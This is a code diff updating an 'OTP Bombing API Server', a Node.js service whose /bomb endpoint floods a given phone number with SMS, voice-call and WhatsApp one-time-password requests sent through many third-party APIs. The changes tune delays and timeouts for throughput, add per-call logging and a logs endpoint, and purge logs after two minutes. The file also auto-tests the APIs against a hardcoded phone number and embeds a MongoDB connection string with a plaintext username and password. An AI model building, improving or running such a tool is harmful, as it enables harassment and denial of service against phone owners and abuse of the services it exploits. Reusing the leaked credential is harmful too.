@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (v4.0)
-// Auto Slow Mode + validateStatus Fix + Calls Working
+// api_server.js - OTP Bombing API Server (v5.0)
+// Hard Timeout + Log Cleanup + Full Logging
 // ============================================================
 
 const express = require('express');
@@ -18,19 +18,97 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // ============================================================
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
-const DB_NAME = "otp_bom";
+const DB_NAME = "otp_bomber";
 
 const MAX_EFFECTIVE_DURATION = 10;
 const FIRST_RUN_RETRY = 1;
-const FIRST_RUN_DELAY = 50;
-const FIRST_RUN_TIMEOUT = 5000;
-const FIRST_RUN_RETRY_DELAY = 200;
+const FIRST_RUN_DELAY = 30;                  // 50 → 30ms
+const FIRST_RUN_TIMEOUT = 3000;              // 5000 → 3000ms
+const FIRST_RUN_RETRY_DELAY = 150;           // 200 → 150ms
 
-// 🔥 AUTO SLOW MODE CONFIG
-const AUTO_SLOW_MODE = true;                    // server start pe auto test
-const AUTO_SLOW_MODE_PHONE = '7777885694';      // dummy test number
-const AUTO_SLOW_MODE_START_DELAY = 5000;        // 5s wait after DB connect
-const AUTO_SLOW_MODE_MAX_DURATION_MS = 10 * 60 * 1000;  // 10 min max
+// 🔥 AUTO SLOW MODE
+const AUTO_SLOW_MODE = true;
+const AUTO_SLOW_MODE_PHONE = '7777885694';
+const AUTO_SLOW_MODE_START_DELAY = 5000;
+const AUTO_SLOW_MODE_MAX_DURATION_MS = 10 * 60 * 1000;  // 10 min
+
+// 🔥 LOG CLEANUP
+const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;  // Har 2 min
+const LOG_RETENTION_MS = 2 * 60 * 1000;          // 2 min se purane logs delete
+
+// ============================================================
+// ===== IN-MEMORY LOG STORE (Auto Cleanup) =====
+// ============================================================
+
+class LogStore {
+    constructor(retentionMs = LOG_RETENTION_MS) {
+        this.logs = [];
+        this.retentionMs = retentionMs;
+        this.cleanupInterval = null;
+    }
+
+    add(level, message, meta = {}) {
+        const log = {
+            timestamp: Date.now(),
+            time: new Date().toISOString(),
+            level,          // 'info' | 'success' | 'fail' | 'warn' | 'error'
+            message,
+            meta
+        };
+        this.logs.push(log);
+        return log;
+    }
+
+    startCleanup() {
+        if (this.cleanupInterval) return;
+        this.cleanupInterval = setInterval(() => {
+            const cutoff = Date.now() - this.retentionMs;
+            const before = this.logs.length;
+            this.logs = this.logs.filter(log => log.timestamp >= cutoff);
+            const removed = before - this.logs.length;
+            if (removed > 0) {
+                console.log(`🧹 Log cleanup: ${removed} old logs removed. Total: ${this.logs.length}`);
+            }
+        }, LOG_CLEANUP_INTERVAL_MS);
+        console.log('✅ Log auto-cleanup started (every 2 min)');
+    }
+
+    getAll() {
+        return this.logs;
+    }
+
+    clear() {
+        this.logs = [];
+    }
+}
+
+const logStore = new LogStore();
+
+// 🔥 Helper logging functions
+function logInfo(message, meta = {}) {
+    console.log(`ℹ️  ${message}`);
+    logStore.add('info', message, meta);
+}
+
+function logSuccess(message, meta = {}) {
+    console.log(`✅ ${message}`);
+    logStore.add('success', message, meta);
+}
+
+function logFail(message, meta = {}) {
+    console.log(`❌ ${message}`);
+    logStore.add('fail', message, meta);
+}
+
+function logWarn(message, meta = {}) {
+    console.log(`⚠️  ${message}`);
+    logStore.add('warn', message, meta);
+}
+
+function logError(message, meta = {}) {
+    console.error(`🔥 ${message}`);
+    logStore.add('error', message, meta);
+}
 
 // ============================================================
 // ===== MONGODB CONNECTION =====
@@ -42,19 +120,18 @@ mongoose.connect(MONGODB_URL, {
     dbName: DB_NAME
 }).then(async () => {
     dbConnected = true;
-    console.log('✅ MongoDB Connected');
+    logSuccess('MongoDB Connected');
     await ensureIndexes();
     await checkFirstRun();
 
-    // 🔥 AUTO SLOW MODE TRIGGER
     if (AUTO_SLOW_MODE && firstRunMode) {
-        console.log(`⏰ Auto slow mode will start in ${AUTO_SLOW_MODE_START_DELAY / 1000}s...`);
+        logInfo(`⏰ Auto slow mode will start in ${AUTO_SLOW_MODE_START_DELAY / 1000}s...`);
         setTimeout(() => {
             triggerAutoSlowMode();
         }, AUTO_SLOW_MODE_START_DELAY);
     }
 }).catch(err => {
-    console.error('❌ MongoDB Error:', err.message);
+    logError('MongoDB Error: ' + err.message);
     dbConnected = false;
 });
 
@@ -63,9 +140,9 @@ async function ensureIndexes() {
         await ApiHealth.collection.createIndex({ api_name: 1 }, { unique: true });
         await ApiHealth.collection.createIndex({ working: 1 });
         await ApiHealth.collection.createIndex({ tested: 1 });
-        console.log('✅ MongoDB indexes created');
+        logSuccess('MongoDB indexes created');
     } catch (err) {
-        console.error('Index error:', err.message);
+        logError('Index error: ' + err.message);
     }
 }
 
@@ -1244,7 +1321,7 @@ for (const api of allApis) {
     }
 }
 
-console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
+logSuccess(`Loaded ${uniqueApis.length} unique APIs`);
 
 // ============================================================
 // ===== GLOBAL STATE =====
@@ -1265,20 +1342,20 @@ async function checkFirstRun() {
         if (count === 0) {
             firstRunMode = true;
             slowModeCompleted = false;
-            console.log('🔄 FIRST RUN MODE: No tested APIs found.');
+            logWarn('FIRST RUN MODE: No tested APIs found.');
         } else {
             firstRunMode = false;
             slowModeCompleted = true;
             const workingCount = await ApiHealth.countDocuments({ working: true });
-            console.log(`✅ Loaded ${count} tested APIs (${workingCount} working). Normal mode active.`);
+            logSuccess(`Loaded ${count} tested APIs (${workingCount} working). Normal mode active.`);
         }
     } catch (err) {
-        console.error('First-run check error:', err.message);
+        logError('First-run check error: ' + err.message);
     }
 }
 
 // ============================================================
-// ===== API CALL FUNCTION (validateStatus FIX) =====
+// ===== API CALL FUNCTION (HARD TIMEOUT) =====
 // ============================================================
 
 function makeFallbackData(phone, apiName) {
@@ -1292,7 +1369,8 @@ function makeFallbackData(phone, apiName) {
     return JSON.stringify({ mobile: phone });
 }
 
-async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
+// 🔥 Internal axios call
+async function _axiosCall(api, phone, timeoutMs, retryCount) {
     const startTime = Date.now();
     try {
         let url = api.url;
@@ -1342,8 +1420,8 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
             url,
             headers,
             timeout: timeoutMs,
-            maxRedirects: 5,
-            validateStatus: () => true   // 🔥 YEH WAPAS ADD KIYA
+            maxRedirects: 3,
+            validateStatus: () => true
         };
 
         if (method === 'post' || method === 'put') {
@@ -1362,19 +1440,15 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
 
         const response = await axios(config);
         const responseTime = Date.now() - startTime;
-
-        // 🔥 2xx, 3xx, 4xx sab success (sirf 5xx fail)
         const success = response.status >= 200 && response.status < 500;
 
         return { success, status: response.status, responseTime };
     } catch (err) {
-        // Retry on network errors
         if (retryCount < 1 &&
             (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
-            return makeApiCall(api, phone, timeoutMs, retryCount + 1);
+            return _axiosCall(api, phone, timeoutMs, retryCount + 1);
         }
 
-        // 🔥 Agar response hai (4xx/5xx) toh status check karo
         if (err.response) {
             const status = err.response.status;
             const success = status >= 200 && status < 500;
@@ -1385,38 +1459,54 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
     }
 }
 
+// 🔥 HARD TIMEOUT wrapper — guarantees result in timeoutMs + buffer
+async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
+    const HARD_TIMEOUT_BUFFER = 1000;  // 1s extra buffer
+
+    return Promise.race([
+        _axiosCall(api, phone, timeoutMs, retryCount),
+        new Promise((resolve) =>
+            setTimeout(() => {
+                resolve({
+                    success: false,
+                    status: null,
+                    responseTime: timeoutMs + HARD_TIMEOUT_BUFFER,
+                    hardTimeout: true
+                });
+            }, timeoutMs + HARD_TIMEOUT_BUFFER)
+        )
+    ]);
+}
+
 // ============================================================
-// ===== FIRST-RUN SLOW MODE (LOCKED) =====
+// ===== FIRST-RUN SLOW MODE (LOCKED + HARD TIMEOUT) =====
 // ============================================================
 
 async function firstRunSlowMode(testPhone) {
     const phoneToTest = testPhone || AUTO_SLOW_MODE_PHONE;
 
-    // 🔥 Agar already chal raha hai, toh wahi promise return karo
     if (slowModeLock) {
-        console.log('⏳ Slow mode already running. Waiting for completion...');
+        logInfo('Slow mode already running. Waiting for completion...');
         return await slowModeLock;
     }
 
-    // 🔥 Agar already complete ho chuka hai, toh DB se load karo
     if (slowModeCompleted) {
-        console.log('✅ Slow mode already completed. Loading from DB...');
+        logSuccess('Slow mode already completed. Loading from DB...');
         return await loadWorkingApis();
     }
 
-    // 🔥 Naya slow mode start karo, lock set karo
     slowModeLock = (async () => {
         try {
-            console.log(`🐢 FIRST RUN SLOW MODE: Testing all APIs (phone: ${phoneToTest})...`);
+            logInfo(`FIRST RUN SLOW MODE: Testing all APIs (phone: ${phoneToTest})...`);
             const workingApis = [];
             const startTime = Date.now();
 
             for (let i = 0; i < uniqueApis.length; i++) {
                 const api = uniqueApis[i];
 
-                // 🔥 10 min ka timer check
+                // 🔥 10 min timer check
                 if (Date.now() - startTime > AUTO_SLOW_MODE_MAX_DURATION_MS) {
-                    console.log(`⏰ 10 min timer reached! Stopping slow mode at API ${i + 1}/${uniqueApis.length}`);
+                    logWarn(`10 min timer reached! Stopping at API ${i + 1}/${uniqueApis.length}`);
                     break;
                 }
 
@@ -1443,9 +1533,8 @@ async function firstRunSlowMode(testPhone) {
                 }
 
                 const avgTime = Math.round(totalResponseTime / Math.max(1, (successCount + failCount)));
-                const timeout = Math.max(2000, Math.min(avgTime * 2, 10000));
+                const timeout = Math.max(2000, Math.min(avgTime * 2, 8000));
 
-                // Save to DB
                 try {
                     await ApiHealth.findOneAndUpdate(
                         { api_name: api.name },
@@ -1464,24 +1553,23 @@ async function firstRunSlowMode(testPhone) {
                         { upsert: true, new: true }
                     );
                 } catch (dbErr) {
-                    console.error(`DB save error for ${api.name}:`, dbErr.message);
+                    logError(`DB save error for ${api.name}: ${dbErr.message}`);
                 }
 
                 if (success) {
                     workingApis.push({ api, timeout });
-                    console.log(`✅ [${i + 1}/${uniqueApis.length}] ${api.name} - WORKING (${avgTime}ms)`);
+                    logSuccess(`[${i + 1}/${uniqueApis.length}] ${api.name} - WORKING (${avgTime}ms)`, { api: api.name, time: avgTime });
                 } else {
-                    console.log(`❌ [${i + 1}/${uniqueApis.length}] ${api.name} - FAILED`);
+                    logFail(`[${i + 1}/${uniqueApis.length}] ${api.name} - FAILED`, { api: api.name });
                 }
 
-                // Small delay between APIs
                 await new Promise(r => setTimeout(r, FIRST_RUN_DELAY));
             }
 
             firstRunMode = false;
             slowModeCompleted = true;
             const totalTime = Math.round((Date.now() - startTime) / 1000);
-            console.log(`🎯 First run complete in ${totalTime}s. ${workingApis.length}/${uniqueApis.length} APIs working.`);
+            logSuccess(`First run complete in ${totalTime}s. ${workingApis.length}/${uniqueApis.length} APIs working.`);
 
             return workingApis;
         } finally {
@@ -1493,22 +1581,22 @@ async function firstRunSlowMode(testPhone) {
 }
 
 // ============================================================
-// ===== AUTO SLOW MODE TRIGGER =====
+// ===== AUTO SLOW MODE =====
 // ============================================================
 
 async function triggerAutoSlowMode() {
     if (autoSlowModeRunning) return;
     autoSlowModeRunning = true;
 
-    console.log('⏰ AUTO SLOW MODE STARTING (server startup test)...');
-    console.log(`📞 Test phone: ${AUTO_SLOW_MODE_PHONE}`);
-    console.log(`⏱️  Max duration: ${AUTO_SLOW_MODE_MAX_DURATION_MS / 1000 / 60} minutes`);
+    logInfo('AUTO SLOW MODE STARTING (server startup test)...');
+    logInfo(`Test phone: ${AUTO_SLOW_MODE_PHONE}`);
+    logInfo(`Max duration: ${AUTO_SLOW_MODE_MAX_DURATION_MS / 1000 / 60} minutes`);
 
     try {
         await firstRunSlowMode(AUTO_SLOW_MODE_PHONE);
-        console.log('✅ AUTO SLOW MODE COMPLETED');
+        logSuccess('AUTO SLOW MODE COMPLETED');
     } catch (err) {
-        console.error('❌ AUTO SLOW MODE ERROR:', err.message);
+        logError('AUTO SLOW MODE ERROR: ' + err.message);
     } finally {
         autoSlowModeRunning = false;
     }
@@ -1559,22 +1647,23 @@ app.post('/bomb', async (req, res) => {
 
     const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);
 
-    console.log(`📱 Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'} | FirstRun: ${firstRunMode} | SlowLock: ${!!slowModeLock}`);
+    logInfo(`Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | FirstRun: ${firstRunMode} | SlowLock: ${!!slowModeLock}`);
 
     try {
         const startTime = Date.now();
         let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
+        const apiCallLogs = [];
 
         let workingApis = [];
 
         if (firstRunMode || !slowModeCompleted) {
-            console.log('⏳ Waiting for slow mode to complete...');
+            logInfo('Waiting for slow mode to complete...');
             workingApis = await firstRunSlowMode(phone);
         } else {
             workingApis = await loadWorkingApis();
 
             if (workingApis.length === 0) {
-                console.log('⚠️ No working APIs in DB. Activating slow mode...');
+                logWarn('No working APIs in DB. Activating slow mode...');
                 workingApis = await firstRunSlowMode(phone);
             }
         }
@@ -1618,13 +1707,23 @@ app.post('/bomb', async (req, res) => {
                 const result = results[k];
                 const item = batch[k];
 
-                if (result.status === 'fulfilled' && result.value && result.value.success) {
-                    success++;
-                    sent++;
-                    const apiName = (item.api.name || '').toLowerCase();
-                    if (apiName.includes('call') || apiName.includes('voice')) callCount++;
-                    else if (apiName.includes('whatsapp')) whatsappCount++;
-                    else smsCount++;
+                // 🔥 HAR API CALL LOG
+                if (result.status === 'fulfilled' && result.value) {
+                    const val = result.value;
+                    const apiName = item.api.name;
+                    if (val.success) {
+                        logSuccess(`API ${apiName} → ${val.status || 'OK'} (${val.responseTime}ms)`);
+                        success++;
+                        sent++;
+                        const lowerName = apiName.toLowerCase();
+                        if (lowerName.includes('call') || lowerName.includes('voice')) callCount++;
+                        else if (lowerName.includes('whatsapp')) whatsappCount++;
+                        else smsCount++;
+                    } else {
+                        logFail(`API ${apiName} → FAIL (${val.responseTime}ms)${val.hardTimeout ? ' [HARD TIMEOUT]' : ''}`);
+                    }
+                } else {
+                    logFail(`API ${item.api.name} → REJECTED`);
                 }
             }
 
@@ -1634,6 +1733,8 @@ app.post('/bomb', async (req, res) => {
         }
 
         const elapsed = (Date.now() - startTime) / 1000;
+
+        logSuccess(`Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s`);
 
         res.json({
             success: true,
@@ -1647,7 +1748,7 @@ app.post('/bomb', async (req, res) => {
         });
 
     } catch (error) {
-        console.error('Bombing error:', error);
+        logError('Bombing error: ' + error.message);
         res.status(500).json({ error: error.message });
     }
 });
@@ -1689,13 +1790,24 @@ app.get('/health-apis', async (req, res) => {
     }
 });
 
+app.get('/logs', (req, res) => {
+    const limit = parseInt(req.query.limit) || 100;
+    const logs = logStore.getAll();
+    const recent = logs.slice(-limit);
+    res.json({
+        total_logs: logs.length,
+        retention: '2 minutes',
+        logs: recent
+    });
+});
+
 app.post('/reset-health', async (req, res) => {
     try {
         await ApiHealth.deleteMany({});
         firstRunMode = true;
         slowModeCompleted = false;
         slowModeLock = null;
-        console.log('🔄 Health data reset. First-run mode activated.');
+        logWarn('Health data reset. First-run mode activated.');
         res.json({ success: true, message: 'Health data reset. Next /bomb will trigger slow mode.' });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -1742,11 +1854,15 @@ app.get('/health-stats', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 API Server running on port ${PORT}`);
-    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    console.log(`📊 APIs loaded: ${uniqueApis.length}`);
-    console.log(`⏱️  Max effective duration: ${MAX_EFFECTIVE_DURATION} min`);
-    console.log(`🐢 First-run slow mode: Enabled (LOCKED)`);
-    console.log(`💾 MongoDB health tracking: Enabled`);
-    console.log(`⏰ Auto slow mode: ${AUTO_SLOW_MODE ? 'ENABLED' : 'DISABLED'}`);
+    logSuccess(`API Server running on port ${PORT}`);
+    logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
+    logInfo(`APIs loaded: ${uniqueApis.length}`);
+    logInfo(`Max effective duration: ${MAX_EFFECTIVE_DURATION} min`);
+    logInfo(`First-run slow mode: Enabled (LOCKED)`);
+    logInfo(`MongoDB health tracking: Enabled`);
+    logInfo(`Auto slow mode: ${AUTO_SLOW_MODE ? 'ENABLED' : 'DISABLED'}`);
+    logInfo(`Log retention: 2 minutes (auto-cleanup)`);
+
+    // 🔥 Start log auto-cleanup
+    logStore.startCleanup();
 });
